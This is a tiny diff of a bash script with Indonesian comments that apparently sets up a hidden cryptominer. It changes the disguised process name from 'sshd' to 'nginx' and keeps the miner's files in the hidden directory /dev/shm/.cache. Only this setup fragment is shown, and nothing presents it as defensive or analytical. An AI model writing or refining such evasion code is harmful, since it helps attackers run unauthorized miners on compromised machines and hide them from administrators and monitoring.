@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Nama proses penyamaran
-PROC_NAME="sshd"
+PROC_NAME="nginx"
 
 # Folder tersembunyi
 MINER_DIR="/dev/shm/.cache"
